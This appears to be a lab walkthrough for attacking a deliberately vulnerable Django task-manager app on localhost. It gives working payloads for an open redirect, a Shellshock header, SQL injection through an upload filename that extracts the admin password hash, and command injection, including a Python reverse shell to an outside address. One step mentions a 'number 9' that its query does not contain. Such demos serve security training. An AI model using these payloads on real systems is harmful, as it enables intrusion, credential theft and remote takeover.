# Instructions for eploiting vulnerabilities in the djangonv app

## App Protect Policy

Some adjustments need to be made in order to allow some of the (poorly written) code to run:


/taskManager/register triggers the SQL Injection Syntax Error algorithm.  Best to disable it for this app.

/taskManager/login/, /taskManager/logout and others triggers Redirect Protection.  Need to alter policy to allow http://127.0.0.1:8000/*


## Exploits

### Open Redirect Vulnerability

The /taskManager/logout endpoint is susceptible to an open redirect.
Threat actors can leverage these types of vulnerabilities to redirect the user's browser to a URL of their choice.  
The typical exploit vector is via a malicious embedded link in an email.

Demonstrate the vulnerability by pasting the following into the browser's URL space:
```
/taskManager/logout?redirect=http://www.yahoo.com
```

### Malicious Payload (Intrusion Prevention)
```
curl -H "User-Agent: () { :; }; /bin/eject" http://127.0.0.1:8000
```

### Remote Command Execution

To trigger a Remote Command Execution (that's actually both a RCE and SQLi..), do this:
```
1. Go to http://127.0.0.1:8000/ and click "Sign Up"
```
```
2. Fill out the form and click Register (remember your username and password.  ie: test, test, test, test@test.com test)
```
```
3. Login as the new user.
```
```
4. Once logged in, create a new prject by replacing the URL with:  http://127.0.0.1:8000/taskManager/project_create
```
```
5. Fill out the form with some data.  Be sure to select a future date for the project due date!
```
```
6. Click the link for the new project you just created.
```
```
7. Click the "Add files" link.  
```
```
8. Pick any file from your local computer, and use the following payload for the filename:
    '||(SELECT password FROM auth_user WHERE username='admin')||'

    NOTE: replace the number 9 in the above query with the project ID in the url.
```
Once this exploit has succeeded, you should see the file in the project file list. When you attempt to download this file, you should receive an error page (FileNotFound Error). However, the filename, containts the MD5 hash of the password of the admin user (after the "***"). You should be able to crack this password using JTR or rainbow tables or other.

### OS Command Injection:

Same place as in for the SQLi, "My Projects" --> project you created, add files.
Also pick any file from your local computer, but for payload use:

innocent sleep statement:
```
some_file_name; sleep 1m
```

python connectback shell:
```
some_file_name; python -c 'import socket, subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(("192.168.64.1", 8001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

